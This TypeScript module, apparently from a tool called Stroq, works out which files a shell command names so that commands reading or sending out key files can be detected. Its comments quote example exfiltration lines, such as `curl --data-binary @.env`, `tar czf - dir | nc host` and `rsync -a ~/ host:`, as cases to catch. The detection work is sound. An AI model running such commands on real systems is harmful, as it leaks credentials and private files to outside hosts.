// The files a shell command names, read from its words, so that what a command did with a key
// file (a file keys were read from) can be found: `curl --data-binary @.env`, `scp ./.env host:`,
// `bash up.sh .env`, `tar czf - dir | nc host`. A file the AI wrote a key into is followed by
// coarser rules, by its name alone (`analyze.ts`). A word names a path as it is, or after its last
// `@` or its first `=` (`-d @file`, `--upload-file=file`). A relative path is read against the
// folder the session ran in and every folder it changed to (`cd`), and also as the end of a path
// (`leak.txt`, `work/leak.txt`, `~/../tmp/work/leak.txt` all name `/tmp/work/leak.txt`), since a
// folder changed to in a way Stroq cannot read would be missed otherwise.
//
// A pattern names every file it may match, read one folder at a time: the text before its first
// wildcard must start the name and the text after its last must end it. How sure that is depends on
// who fills it in, read from the core's own reading of the command's words and quotes:
//
//   - a wildcard the shell fills in (unquoted), that needs no dotglob to reach the file: sure;
//   - a `*` or `?` that would reach a file whose name starts with a dot only with dotglob,
//     `GLOB_DOTS` or `GLOBIGNORE`; a quoted wildcard handed to a program that fills in its own
//     arguments (`curl -T` with `{}` or `[]`, `find -name`, `tar --wildcards`, an rsync filter,
//     a git pathspec); any wildcard in a command whose quotes do not balance: maybe;
//   - a quoted wildcard handed to a program that fills in nothing (a JSON body to `curl -d`), or a
//     word that is only braces or brackets: no file at all.
//
// The words are also cut at blanks, quotes and the shell's operators by one class, for the paths
// a quoted script names (`python3 -c "open('.env')"`): those are read as the paths they spell,
// never as patterns. Nothing backtracks.
import { baseName, driveOf, isAbsolutePath, joinPath, normalPath, slashed } from './path-form.js';
import { lex, REDIRECT, resolve, splitCommand, type Resolved, type Word } from '@stroq/core';
import { quotedStageTexts, runsQuotedText } from './quoted-cut.js';
import { readBudgetLeft } from './shell-read.js';

/** The words of a text a file could be named by: cut at blanks, quotes and the shell's operators. */
export const pathWords = (text: string): string[] =>
  text.split(/[\s;&|()<>'"`]+/).filter((w) => w !== '');

/** A word a command may name a file by, and how its wildcards are read. */
export interface PathWord {
  readonly text: string;
  /** Its wildcards are filled in, by the shell or by the program: it names what it may match. */
  readonly pattern: boolean;
  /** Who fills them in is sure (the shell); else a program, or quotes that do not balance. */
  readonly sure: boolean;
}

/** Where a command may run: the session's folder and the folders it changed to. */
export interface Folders {
  readonly cwd: string | null;
  readonly more?: readonly string[];
  /**
   * These are every folder the command may run in: the folder it starts in is known and none of its
   * changes of folder was left unread. A word that spells only the end of a folder's path then names it
   * only if it is under one of them; otherwise the end of a path is all there is to go by.
   */
  readonly exact?: boolean;
  /** The home folder: `~`, `$HOME` and `${HOME}` are read against it. */
  readonly home?: string;
}

/**
 * What makes a word a pattern the shell or curl fills in: `*`, `?`, a brace, a bracket that opens a class
 * (`[ab]`, `[]a]`). A `[]` with nothing in it is text to the shell and to curl: the filter `.[]` of `jq`
 * and `gh --jq` is no pattern that takes every file whose name starts with a dot.
 */
const WILD = /[*?{]|\[(?:[^\]]|\][^\]]*\])/;
/** What the shell fills in on its own: a brace with no comma is plain text to it. */
const SHELL_WILD = /[*?]|\[(?:[^\]]|\][^\]]*\])/;
/** One character of either, for finding where the last wildcard of a pattern is. */
const WILD_CHAR = /[*?[{]/;

/**
 * A pattern that is more than braces, brackets and dots: `{`, `}`, `[]` and `.[]` (a `jq` filter) alone
 * name no file.
 */
const pathLike = (word: string): boolean => /[^.]/.test(word.replace(/[{}[\],]/g, ''));

/**
 * A word that is under no folder in particular because every path is: `/`, `//`, `~`, `~/`, `$HOME`, `${HOME}`,
 * a lone backslash. It names a folder only by containing it.
 */
export const isEverywhere = (word: string): boolean =>
  /^(?:[\\/]+|~\/*|\$\{?HOME\}?\/*)$/.test(word);

/** A slashed path without the slash that ends it, unless it is a root (`/`, `C:/`). */
const trimSep = (path: string): string =>
  path.length > 1 && path.endsWith('/') && !/^[A-Za-z]:\/$/.test(path) ? path.slice(0, -1) : path;

/** Options of `find` whose value it matches file names against. */
const FIND_NAMES: ReadonlySet<string> = new Set([
  '-name',
  '-iname',
  '-path',
  '-ipath',
  '-wholename',
  '-iwholename',
]);
const RSYNC_FILTERS: ReadonlySet<string> = new Set(['--include', '--exclude', '--filter', '-f']);

/** Whether a program fills in the wildcards of an argument it is handed in quotes. */
function programGlobs(found: Resolved, at: number, value: string, tarWildcards: boolean): boolean {
  const before = found.args[at - 1]?.value ?? '';
  switch (found.name) {
    case 'curl':
      // curl fills in `{a,b}` and `[1-9]` in what it uploads, not `*`.
      return (
        (before === '-T' || before === '--upload-file' || /^(?:-T|--upload-file=)/.test(value)) &&
        /[{[]/.test(value)
      );
    case 'find':
      return FIND_NAMES.has(before);
    case 'tar':
    case 'gtar':
    case 'bsdtar':
      return tarWildcards;
    case 'rsync':
      return RSYNC_FILTERS.has(before) || /^--(?:include|exclude|filter)=/.test(value);
    case 'git':
      return true;
    default:
      return false;
  }
}

/** The words a word of a stage may name a file by: a redirect's file without its operator. */
function valueOf(word: Word): string {
  if (!word.redirect) return word.value;
  const operator = REDIRECT.exec(word.value);
  return operator === null ? word.value : word.value.slice(operator[0].length);
}

/**
 * Whether a word written with quotes still has a wildcard outside them: `/w/"x"*.env`. What is quoted or
 * escaped is not dropped but kept as a plain character: a `[` the shell reads as a bracket is closed by a
 * later `]` even when every member between them is quoted (`.en["v"]`), and `[]` with nothing in it is not.
 */
const globOutsideQuotes = (raw: string | undefined): boolean => {
  if (raw === undefined) return false;
  const PLAIN = 'a';
  let quote = '';
  let outside = '';
  for (let i = 0; i < raw.length; i += 1) {
    const c = raw[i] as string;
    if (c === '\\' && quote !== "'") {
      outside += PLAIN;
      i += 1;
    } else if (quote !== '') {
      if (c === quote) quote = '';
      else outside += PLAIN;
    } else if (c === "'" || c === '"') quote = c;
    else outside += c;
  }
  return SHELL_WILD.test(outside);
};

/** Whether a stage's own quotes do not balance, as the core's lexer reads the stage alone. */
function unbalancedStage(text: string): boolean {
  try {
    return lex(text).uncertain;
  } catch {
    return true;
  }
}

/** Programs whose words are a message, and not a path. */
const PRINTERS: ReadonlySet<string> = new Set(['echo', 'printf']);
/** Programs whose first word, unless an option gives it, is a pattern or a program, and the rest are files. */
const PATTERN_FIRST: ReadonlySet<string> = new Set([
  'grep',
  'egrep',
  'fgrep',
  'rg',
  'ag',
  'sed',
  'awk',
  'gawk',
  'jq',
]);
/** Options that give the pattern or the program of those programs, so that every word is a file. */
const PATTERN_OPTIONS: ReadonlySet<string> = new Set([
  '-e',
  '--regexp',
  '--expression',
  '-f',
  '--file',
  '--from-file',
]);

/**
 * The indexes of the words of a stage that are text and not paths: everything `echo` and `printf` are given, and the
 * pattern or program of `grep`, `sed`, `awk` and `jq` (the first word that is no option, or what `-e` gives). A
 * pattern is not a path even where it spells one; the files that follow are.
 */
function textArguments(program: string, args: readonly Word[]): Set<number> {
  const text = new Set<number>();
  if (PRINTERS.has(program)) {
    args.forEach((word, at) => {
      if (!word.redirect) text.add(at);
    });
    return text;
  }
  if (!PATTERN_FIRST.has(program)) return text;
  let given = false;
  args.forEach((word, at) => {
    if (word.redirect) return;
    if (/^(?:-e|--regexp|--expression)$/.test(args[at - 1]?.value ?? '')) text.add(at);
    if (
      PATTERN_OPTIONS.has(word.value) ||
      /^--(?:regexp|expression|file|from-file)=/.test(word.value)
    )
      given = true;
  });
  if (given) return text;
  const first = args.findIndex((word) => !word.redirect && !word.value.startsWith('-'));
  if (first >= 0) text.add(first);
  return text;
}

/**
 * The words of one stage, as the core resolves it, with how sure each wildcard is. A wildcard
 * outside quotes, by the word's own text, is the shell's: sure, unless this stage's quotes do not
 * balance. One inside quotes is a maybe only when the program fills it in itself.
 */
function stageWords(text: string): PathWord[] {
  let found: Resolved | null = null;
  try {
    found = resolve(text);
  } catch {
    found = null;
  }
  if (found === null) return plainWords(text, true);
  const unbalanced = unbalancedStage(text);
  const tarWildcards = found.args.some((w) => w.value === '--wildcards');
  const out: PathWord[] = [];
  const pattern = textArguments(found.name, found.args);
  for (const [at, word] of found.args.entries()) {
    if (pattern.has(at)) continue;
    const value = valueOf(word);
    if (value === '') continue;
    const shellGlob =
      word.raw === undefined ? !word.quoted && SHELL_WILD.test(value) : globOutsideQuotes(word.raw);
    if (!WILD.test(value) || !pathLike(value))
      out.push({ text: value, pattern: false, sure: true });
    else if (shellGlob) out.push({ text: value, pattern: true, sure: !unbalanced });
    else if (unbalanced || (word.quoted && programGlobs(found, at, value, tarWildcards)))
      out.push({ text: value, pattern: true, sure: false });
    else out.push({ text: value, pattern: false, sure: true });
  }
  return out;
}

/**
 * The words of a text cut by one class, as the paths they spell. `uncertain`: a wildcard in one may
 * be filled in, nobody can say by whom (a word only this cut sees, a text too long to read).
 */
function plainWords(text: string, uncertain: boolean): PathWord[] {
  return pathWords(text).map((w) =>
    uncertain && WILD.test(w) && pathLike(w)
      ? { text: w, pattern: true, sure: false }
      : { text: w, pattern: false, sure: true },
  );
}

/** Programs that only handle text: what is quoted in their words is a pattern or a message, not a path. */
const TEXT_PROGRAMS: ReadonlySet<string> = new Set([
  'echo',
  'printf',
  'grep',
  'egrep',
  'fgrep',
  'rg',
  'ag',
  'sed',
  'awk',
  'gawk',
  'jq',
]);

/** The program a stage runs, or ''. */
function programOf(stage: string): string {
  try {
    return resolve(stage)?.name ?? '';
  } catch {
    return '';
  }
}

/** A command longer than this is read only as plain words: any wildcard in it is a maybe. */
const MAX_WORDS_CHARS = 64 * 1024;

let lastWords: {
  readonly text: string;
  readonly quoted: boolean;
  readonly words: PathWord[];
} | null = null;

/**
 * Every word a command may name a file by: those of each stage of the command and of every text
 * it nests (a `bash -c` body, a substitution), as the core reads them, with how sure each wildcard
 * is; and the command cut by one class, as the paths its quoted text spells.
 */
export function commandPathWords(text: string, quotedIsCode = false): PathWord[] {
  if (lastWords !== null && lastWords.text === text && lastWords.quoted === quotedIsCode)
    return lastWords.words;
  let words: PathWord[];
  // Too long, or past the run's time for reading commands: the plain cut, every wildcard a maybe.
  if (text.length > MAX_WORDS_CHARS || !readBudgetLeft()) words = plainWords(text, true);
  else {
    try {
      const nested = splitCommand(text).texts.slice(1);
      words = [];
      // The words only the plain cut of a stage sees, by whether its program only handles text.
      const printed = new Set<string>();
      const other = new Set<string>();
      for (const each of [text, ...nested]) {
        const lexed = lex(each).pipelines.flat();
        for (const stage of lexed) words.push(...stageWords(stage.text));
        // The stages whose quoted text is told apart by program are the quote-aware ones: a `$(…)` or a loop
        // body is cut out of the stage that holds it, so its `grep 'users'` is a grep and not part of a `for`.
        const stages =
          quotedStageTexts(each, (t) => splitCommand(t).pipelines) ??
          lexed.map((stage) => stage.text);
        for (const stage of stages) {
          const into = TEXT_PROGRAMS.has(programOf(stage)) ? printed : other;
          for (const w of plainWords(stage, true)) into.add(w.text);
        }
      }
      // What only the plain cut sees (a path a quoted script spells) is read as that path, and a
      // wildcard in it as a pattern someone may fill in: never as a plain name. Not a word that names every
      // folder (`/`, `~`, a stray `\`) or `.`, which are a stage's own argument or name nothing; and not a word
      // of the quoted text of a program that only handles text (`echo`, `grep`, `sed`, `awk`: a pattern is not a path).
      const seen = new Set(words.map((w) => w.text));
      words.push(
        ...plainWords(text, true).filter(
          (w) =>
            !seen.has(w.text) &&
            !isEverywhere(w.text) &&
            !/^\.{1,2}\/?$/.test(w.text) &&
            !(!quotedIsCode && printed.has(w.text) && !other.has(w.text)),
        ),
      );
    } catch {
      words = plainWords(text, true);
    }
  }
  lastWords = { text, quoted: quotedIsCode, words };
  return words;
}

/**
 * The texts a word may name a path by: the word, and what follows its last `@` or its first `=`
 * (`-d @file`, `-F x=@file`, `--upload-file=file`, `if=file`). A URL, or a file on another host
 * (`host:/path`), names none here.
 */
function candidatesOf(word: string): string[] {
  const found = new Set([
    word,
    word.slice(word.lastIndexOf('@') + 1),
    word.slice(word.indexOf('=') + 1),
  ]);
  return [...found].filter(
    (c) => c !== '' && !c.includes('://') && (isAbsolutePath(c) || !c.includes(':')),
  );
}

/**
 * Options that change the folder one command reads its relative paths in (`tar -C dir`, `--directory`,
 * `git -C`, `--git-dir`, `--work-tree`, `make -C`, `npm --prefix`, `--cwd`, `zip -b`): the word after one
 * is read in a folder the session never changed to. `-C` is any short option cluster that holds a `C`
 * (`-xzC`, `-Cdir`), also where it is a count of lines (`grep -C 3`): then the folders are not all known,
 * which only returns a word to naming a folder by the end of its path.
 */
const FOLDER_OPTION =
  /^(?:--(?:directory|git-dir|work-tree|prefix|cwd|chdir|workdir|dir|project-dir|project-directory|root|manifest-path)|-chdir)(?:=|$)|^-[A-Za-z]*C|^(?:GIT_DIR|GIT_WORK_TREE)=/;
const ZIP_TEMP = /^-b/;

/** Whether a command has an option that changes the folder for the program it is given to. */
export function changesFolderByOption(command: string): boolean {
  const words = commandPathWords(command, runsQuotedText(command)).map((w) => w.text);
  if (words.some((w) => FOLDER_OPTION.test(w))) return true;
  return words.includes('zip') && words.some((w) => ZIP_TEMP.test(w));
}

/** The folders a relative path is read against. */
const basesOf = (folders: Folders): string[] =>
  [folders.cwd, ...(folders.more ?? [])].filter((f): f is string => f !== null);

/**
 * The last part of every path a command's words may name, and whether a word is a pattern or a
 * folder named by `.`: for finding the commands that may name a file by another path. A wildcard
 * nobody fills in is no pattern.
 */
export function namedEnds(
  command: string,
  home?: string,
): { readonly ends: Set<string>; readonly wild: boolean; readonly broad: boolean } {
  const ends = new Set<string>();
  // Past the run's time for reading commands, a command may name any file.
  let wild = !readBudgetLeft();
  // A word that is the root or the home folder: it ends in no name, and every key file is under it.
  let broad = false;
  for (const word of commandPathWords(command, runsQuotedText(command)))
    for (const c of candidatesOf(word.text)) {
      if ((word.pattern && WILD.test(c) && pathLike(c)) || /^\.{1,2}\/?$/.test(c)) wild = true;
      if (isEverywhere(c) || (isAbsolutePath(c) && isBroadPath(c, home))) broad = true;
      ends.add(baseName(trimSep(slashed(c))));
    }
  return { ends, wild, broad };
}

/** How a path names a file, and whether that is sure. */
export interface Naming {
  readonly kind: 'file' | 'folder';
  readonly sure: boolean;
  /** The word is a pattern: the file is named by what a wildcard may fill in, not by its own name. */
  readonly glob?: true;
  /**
   * The folder named is the root or the home folder: every key file is under it, so it names none by itself. It
   * counts only where the folder is archived or uploaded (`tar czf - ~ | curl -T -`, `rsync -a ~/ host:`).
   */
  readonly broad?: true;
  /** The folder is named by the end of its path, a word that is a name: not an explicit path. */
  readonly byEnd?: true;
}

/**
 * Whether a part of a pattern matches a part of a path: its text before and after the wildcards.
 * `dot`: it matches a name that starts with a dot, which a glob reaches only with dotglob; a brace
 * reaches it.
 */
function partMatches(pattern: string, part: string): 'yes' | 'dot' | 'no' {
  const first = pattern.search(WILD);
  if (first < 0) return pattern === part ? 'yes' : 'no';
  let last = first;
  for (let i = first; i < pattern.length; i += 1) if (WILD_CHAR.test(pattern[i] ?? '')) last = i;
  const head = pattern.slice(0, first);
  // What follows the last wildcard; a closing `]` or `}` belongs to it.
  const tail = pattern.slice(last + 1).replace(/^[^/]*?[\]}]/, '');
  const fits =
    part.length >= head.length + tail.length && part.startsWith(head) && part.endsWith(tail);
  if (!fits) return 'no';
  return part.startsWith('.') && !pattern.startsWith('.') && !pattern.includes('{') ? 'dot' : 'yes';
}

/** How an absolute pattern names a file, one folder at a time. */
function patternNames(pattern: string, file: string): Naming | null {
  const want = trimSep(pattern).split('/');
  const have = file.split('/');
  if (want.length > have.length) return null;
  let sure = true;
  for (let i = 0; i < want.length; i += 1) {
    const part = want[i] as string;
    if (part === '**') return { kind: 'file', sure, glob: true };
    const match = partMatches(part, have[i] as string);
    if (match === 'no') return null;
    if (match === 'dot') sure = false;
  }
  return { kind: want.length === have.length ? 'file' : 'folder', sure, glob: true };
}

/** A drive as Git Bash (`/c/w`), Cygwin (`/cygdrive/c/w`) and WSL (`/mnt/c/w`) name it. */
const POSIX_DRIVE = /^\/(?:cygdrive\/|mnt\/)?([A-Za-z])(?=\/|$)/;

/**
 * A path from a root as a file on a drive is named: Git Bash names `C:/w` as `/c/w`, Cygwin as
 * `/cygdrive/c/w`, WSL as `/mnt/c/w`. Only for a file on a drive: elsewhere `/c/w` is a folder `c`.
 */
function onDriveOf(path: string, file: string): string {
  const drive = driveOf(file);
  const posixDrive = POSIX_DRIVE.exec(path);
  if (drive === '' || posixDrive === null) return path;
  return `${(posixDrive[1] as string).toUpperCase()}:${path.slice(posixDrive[0].length) || '/'}`;
}

/**
 * A path as a file on a drive, or on a Mac, is compared: in any letter case, since a Windows disk
 * and a Mac's default disk open `.AWS/Credentials` as `.aws/credentials`. Elsewhere a path is
 * compared as spelled.
 */
const CASE_BLIND_HOST = process.platform === 'darwin' || process.platform === 'win32';
const foldFor = (file: string): ((path: string) => string) =>
  CASE_BLIND_HOST || driveOf(file) !== '' ? (path) => path.toLowerCase() : (path) => path;

/**
 * How one absolute path names a file, read as a pattern or as the path it spells. The file is
 * slashed (`normalPath`).
 */
function absoluteNames(path: string, file: string, pattern: boolean): Naming | null {
  const fold = foldFor(file);
  const spelled = fold(onDriveOf(normalPath(path), file));
  const target = fold(file);
  if (pattern && WILD.test(path)) return patternNames(spelled, target);
  const clean = trimSep(spelled);
  if (clean === target) return { kind: 'file', sure: true };
  return target.startsWith(clean.endsWith('/') ? clean : `${clean}/`)
    ? { kind: 'folder', sure: true }
    : null;
}

/** A relative path with what leads it (`./`, `../`, `~/`) dropped. */
const endOf = (path: string): string =>
  normalPath(path)
    .split('/')
    .filter((part) => part !== '' && part !== '.' && part !== '..' && part !== '~')
    .join('/');

/**
 * Whether a folder is the root, the home folder, or a folder the home folder is under (`/Users`, `/home`): every
 * key file of the machine is under one, so no word names it by its name.
 */
function aboveHome(folder: string, home: string | undefined): boolean {
  if (folder === '' || folder === '/' || /^[A-Za-z]:\/?$/.test(folder)) return true;
  if (home === undefined) return false;
  const h = trimSep(normalPath(home));
  return h === folder || h.startsWith(`${folder}/`);
}

/** Whether a folder is a folder a command runs in, or is inside one: inside the session's project. */
const insideAny = (folder: string, bases: readonly string[]): boolean =>
  bases.some((b) => {
    const base = trimSep(normalPath(b));
    return folder === base || folder.startsWith(`${base}/`);
  });

/**
 * How a relative path names a file as the end of its path: `leak.txt` and `work/leak.txt` name
 * `/tmp/work/leak.txt`. A folder it is in is named in two ways, and only these. The path resolves, joined to a
 * folder the command runs in, to a folder the file is in (`tar czf - Documents` run in the home folder). Or, when
 * the folders the command runs in are not all known, its name is the end of such a folder's path, spelled
 * exactly, and the folder is the file's own or is inside a folder the command runs in; never the home folder or
 * one it is under (`/Users`, `Documents` as a word in a search term), and never in another letter case. A word
 * that is a name and no path (`svc`, a branch, a term) is named by its name only.
 */
function endNames(path: string, file: string, where: Folders): Naming | null {
  const fold = foldFor(file);
  const rest = fold(endOf(path));
  if (rest === '') return null;
  const target = fold(file);
  if (target === `/${rest}` || target.endsWith(`/${rest}`)) return { kind: 'file', sure: true };
  const bases = basesOf(where);
  if (bases.some((b) => absoluteNames(joinPath(b, path), file, false) !== null))
    return { kind: 'folder', sure: true, byEnd: true };
  // All the folders the command runs in are known: the path resolves under one of them, or it names nothing.
  if (where.exact === true && !path.startsWith('~')) return null;
  const name = endOf(path);
  const own = file.slice(0, file.lastIndexOf('/'));
  for (let at = file.indexOf(`/${name}/`); at >= 0; at = file.indexOf(`/${name}/`, at + 1)) {
    const folder = file.slice(0, at + 1 + name.length);
    if (aboveHome(folder, where.home)) continue;
    if (folder === own || insideAny(folder, bases))
      return { kind: 'folder', sure: true, byEnd: true };
  }
  return null;
}

/** A word as a path under the home folder when it starts with `~`, `$HOME` or `${HOME}`; null otherwise. */
function homeSpelling(word: string, home: string): string | null {
  const spelled = /^(?:~|\$HOME|\$\{HOME\})(?:\/(.*))?$/.exec(word);
  if (spelled === null) return null;
  return joinPath(home, spelled[1] ?? '');
}

/** Whether a path is the root or the home folder: every key file is under it. */
function isBroadPath(path: string, home: string | undefined): boolean {
  const p = trimSep(normalPath(path));
  if (p === '/' || /^[A-Za-z]:\/?$/.test(p)) return true;
  return home !== undefined && p === trimSep(normalPath(home));
}

/** A naming of a folder that is the root or the home folder, marked as such. */
function broadIf(n: Naming | null, path: string, home: string | undefined): Naming | null {
  return n !== null && n.kind === 'folder' && isBroadPath(path, home) ? { ...n, broad: true } : n;
}

/** The better of two namings: a file over a folder, a sure one over a maybe. */
const better = (a: Naming | null, b: Naming | null): Naming | null => {
  if (a === null) return b;
  if (b === null) return a;
  // A name over a pattern that may take the file in.
  const rank = (n: Naming): number =>
    (n.kind === 'file' ? 0 : 2) + (n.sure ? 0 : 1) + (n.glob === true ? 4 : 0);
  return rank(b) < rank(a) ? b : a;
};

/**
 * How a word of a command names a file: the file itself, a folder it is in, or neither. The file
 * is spelled as `normalPath` spells it.
 */
export function namesFileHow(
  word: PathWord,
  file: string,
  folders: Folders | string | null,
): Naming | null {
  const where: Folders =
    typeof folders === 'object' && folders !== null ? folders : { cwd: folders };
  let found: Naming | null = null;
  for (const c of candidatesOf(word.text)) {
    const pattern = word.pattern && WILD.test(c);
    // Braces or brackets alone are no path, whatever makes something of them.
    if (pattern && !pathLike(c)) continue;
    const take = (n: Naming | null): Naming | null =>
      n === null
        ? null
        : {
            kind: n.kind,
            sure: n.sure && word.sure,
            ...(n.glob === true ? { glob: true as const } : {}),
            ...(n.broad === true ? { broad: true as const } : {}),
            ...(n.byEnd === true ? { byEnd: true as const } : {}),
          };
    // `~`, `$HOME` and `${HOME}` are the home folder when it is known.
    const homed = where.home === undefined ? null : homeSpelling(c, where.home);
    if (homed !== null)
      found = better(found, take(broadIf(absoluteNames(homed, file, pattern), homed, where.home)));
    if (isAbsolutePath(c))
      found = better(found, take(broadIf(absoluteNames(c, file, pattern), c, where.home)));
    else {
      if (c.startsWith('~')) {
        if (normalPath(c) === file) found = better(found, take({ kind: 'file', sure: true }));
      } else if (pattern || endOf(c) === '')
        // A pattern, or a word that is only `.` and `..`: read against each folder.
        for (const base of basesOf(where))
          found = better(found, take(absoluteNames(joinPath(base, c), file, pattern)));
      // Any other relative path is read as the end of a path below, whatever folder it is under.
      // A path from the home folder is read against it when it is known; else by its end.
      if (!pattern && homed === null) found = better(found, take(endNames(c, file, where)));
    }
    if (found?.kind === 'file' && found.sure && found.glob !== true) return found;
  }
  return found;
}

/**
 * How a word names a file, for a word read with no quotes around it: a wildcard in it is a pattern.
 * Only a sure naming counts.
 */
export function namesFile(
  word: string,
  file: string,
  folders: Folders | string | null,
): 'file' | 'folder' | null {
  const named = namesFileHow(
    { text: word, pattern: WILD.test(word) && pathLike(word), sure: true },
    file,
    folders,
  );
  return named !== null && named.sure ? named.kind : null;
}

/** `~` or `~/dir` as a path under the home folder; null for anything else (`~user` is not read). */
function homeTarget(target: string | undefined, home: string): string | null {
  if (target === '~') return home;
  return target?.startsWith('~/') === true ? joinPath(home, target.slice(2)) : null;
}

/** Folders changed to, at most, in one command. */
const MAX_CHANGED = 16;

/** The folders a command changes to, and what of it could not be read. */
export interface FolderChanges {
  readonly folders: string[];
  /** A change to a folder named by a variable, from the home folder, or `cd -`, `popd`, `cd`. */
  readonly unread: boolean;
  /** More changes than are read: the rest were not followed. */
  readonly cut: boolean;
}

/**
 * The folders a command changes to (`cd dir`, `pushd dir`, where a command starts), read against
 * `from` and each other in turn: a relative one is joined to the folder before it. A folder named
 * by a variable or from the home folder is not read, and says so.
 */
export function folderChanges(command: string, from: string | null, home?: string): FolderChanges {
  const folders: string[] = [];
  let now = from;
  let unread = false;
  for (const part of command.replace(/['"\\]/g, '').split(/[;&|()\n]+/)) {
    const words = part.trim().split(/\s+/);
    if (words[0] === 'popd') unread = true;
    if (words[0] !== 'cd' && words[0] !== 'pushd') continue;
    const target = words.slice(1).find((w) => !w.startsWith('-'));
    const homed = home === undefined ? null : homeTarget(target, home);
    if (target === undefined || (target.startsWith('~') && homed === null) || /[$`]/.test(target)) {
      unread = true;
      continue;
    }
    if (homed === null && !isAbsolutePath(target) && now === null) {
      unread = true;
      continue;
    }
    if (folders.length >= MAX_CHANGED) return { folders, unread, cut: true };
    const to = homed ?? (isAbsolutePath(target) ? target : joinPath(now as string, target));
    now = trimSep(normalPath(to));
    folders.push(now);
  }
  return { folders, unread, cut: false };
}

/** The folders a command changes to; see `folderChanges`. */
export const changedFolders = (command: string, from: string | null, home?: string): string[] =>
  folderChanges(command, from, home).folders;
